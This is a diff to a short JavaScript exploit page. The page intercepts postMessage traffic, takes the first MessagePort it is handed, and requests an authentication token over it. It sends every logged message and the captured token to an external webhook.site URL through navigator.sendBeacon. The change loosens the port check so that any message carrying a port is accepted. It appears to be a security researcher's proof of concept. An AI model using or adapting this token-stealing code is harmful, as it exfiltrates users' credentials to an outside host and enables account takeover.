@@ -12,12 +12,14 @@ function log(s){
   o.textContent+=s+"\n";
   try{ navigator.sendBeacon('https://webhook.site/36515863-0fd2-44a1-8261-60969d22e4d1', encodeURIComponent(s)); }catch(e){}
 }
+var portEstablished = false;
 addEventListener('message', function(e){
-  try{ log('MSG '+JSON.stringify(e.data).slice(0,300)); }catch(x){ log('MSG [unserializable]'); }
-  if(e.data && e.data.type==='init_converse' && e.ports && e.ports[0]){
-    var p=e.ports[0];
-    p.onmessage=function(ev){ log('TOKEN '+ev.data); };
-    p.postMessage({id:'1',type:'token'});
+  try{ log('MSG '+JSON.stringify(e.data).slice(0,200)+' ports='+(e.ports?e.ports.length:0)); }catch(x){ log('MSG [unserializable]'); }
+  if(!portEstablished && e.ports && e.ports[0]){
+    portEstablished = true;
+    var p = e.ports[0];
+    p.onmessage = function(ev){ log('TOKEN '+ev.data); };
+    p.postMessage(JSON.stringify({id:'1', type:'token'}));
     log('PORT RECEIVED, token request sent');
   }
 });
